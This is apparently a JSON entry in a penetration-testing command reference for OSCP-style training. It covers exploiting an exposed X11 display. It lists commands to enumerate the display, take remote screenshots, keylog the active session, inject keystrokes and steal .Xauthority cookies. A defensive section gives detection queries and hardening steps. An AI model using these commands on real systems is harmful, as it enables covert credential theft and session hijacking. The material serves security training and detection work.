@@ -1,0 +1,84 @@
+{
+  "id": "recon-x11",
+  "name": "X11 Open Display Abuse - Keylog & Screenshot",
+  "command": "xdotool key --window <id> ; xwd -root -display <target>:0",
+  "description": "An exposed X11 server (TCP 6000-6009) with weak access control (xhost +) lets a remote attacker connect to the display, capture screenshots, log keystrokes, and inject input. Classic Linux exposure giving credential capture and session hijack without exploiting any binary. Enumerate with nmap, then grab the screen or keylog the active session.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Information Gathering",
+  "subcategory": "Service Enumeration",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "PEN-200 service enumeration; nmap NSE",
+  "tags": [
+    "x11",
+    "xorg",
+    "6000",
+    "screenshot",
+    "keylogger",
+    "display",
+    "xhost"
+  ],
+  "mitre": [
+    "T1056.001",
+    "T1113"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== ENUMERATE ===\n  nmap -p6000-6009 -sV <target>\n  nmap -p6000 --script x11-access <target>\n  # x11-access reports whether the display allows unauthenticated clients\n\n=== TEST ACCESS ===\n  xdpyinfo -display <target>:0\n  # If it works, access control is open (xhost + or no magic cookie)\n\n=== SCREENSHOT THE REMOTE DISPLAY ===\n  xwd -root -display <target>:0 -out screenshot.xwd\n  convert screenshot.xwd screenshot.png     # imagemagick\n  # or:\n  import -display <target>:0 -window root screenshot.png\n\n=== KEYLOG THE ACTIVE SESSION ===\n  xspy <target>:0\n  # or xinput: find keyboard id then test\n  xinput --list --short\n  xinput --test <keyboard_id>\n\n=== INJECT KEYSTROKES ===\n  xdotool --display <target>:0 key ctrl+alt+t\n  xdotool --display <target>:0 type \"id > /tmp/pwned\"\n\n=== IF ACCESS IS RESTRICTED (magic cookie) ===\n  # Need ~/.Xauthority cookie; harvest it from the host if you have a shell\n  export XAUTHORITY=/home/<user>/.Xauthority\n\n=== ALTERNATIVES ===\n  recon-vnc        # the other exposed-display vector\n  # Steal .Xauthority + DISPLAY after a foothold for local capture",
+  "examples": [
+    {
+      "label": "Check for open X11",
+      "command": "nmap -p6000 --script x11-access 10.10.10.10"
+    },
+    {
+      "label": "Screenshot remote display",
+      "command": "xwd -root -display 10.10.10.10:0 -out shot.xwd && convert shot.xwd shot.png"
+    },
+    {
+      "label": "Keylog the session",
+      "command": "xspy 10.10.10.10:0"
+    }
+  ],
+  "references": [
+    {
+      "title": "HackTricks - Pentesting X11",
+      "url": "https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11"
+    },
+    {
+      "title": "MITRE T1056.001 - Keylogging",
+      "url": "https://attack.mitre.org/techniques/T1056/001/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "recon-vnc",
+      "note": "VNC is the other classic remote-display exposure.",
+      "rel": "alternative"
+    },
+    {
+      "id": "gs-nmap-service-scan",
+      "note": "Identify the X11 ports first.",
+      "rel": "prereq"
+    }
+  ],
+  "defense": {
+    "why_it_works": "X11 with host-based access control disabled (xhost +) or a leaked .Xauthority cookie lets any client connect to the display and read/inject input, because the X protocol trusts connected clients fully.",
+    "prerequisites": "Network access to TCP 6000-6009; display with open access control or a stolen Xauthority cookie.",
+    "impact": "Screenshot capture, keystroke logging (credential theft), and input injection on the victim desktop.",
+    "detection": "[MITRE T1056.001/T1113] Remote TCP connections to 6000-6009; xwd/import/xspy usage; X server accepting unauthenticated remote clients.",
+    "artifacts": "Network connections to X11 ports from non-local hosts; X server logs of foreign clients.",
+    "splunk_spl": "index=network dest_port>=6000 dest_port<=6009 NOT src_ip=127.0.0.1\n| stats count by src_ip, dest_ip",
+    "elastic_kql": "destination.port:(6000 or 6001 or 6002) and not source.ip:\"127.0.0.1\"",
+    "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort between (6000 .. 6009) and RemoteIP !startswith \"127.\"\n| project Timestamp, DeviceName, RemoteIP, RemotePort",
+    "sigma_rules": "net_x11_remote_access",
+    "prevention": "Disable X11 TCP listening (-nolisten tcp, default on modern distros); never run xhost +; use SSH X11 forwarding; firewall 6000-6009; protect .Xauthority; prefer Wayland.",
+    "sources": [
+      "HackTricks",
+      "https://attack.mitre.org/techniques/T1056/001/"
+    ]
+  }
+}
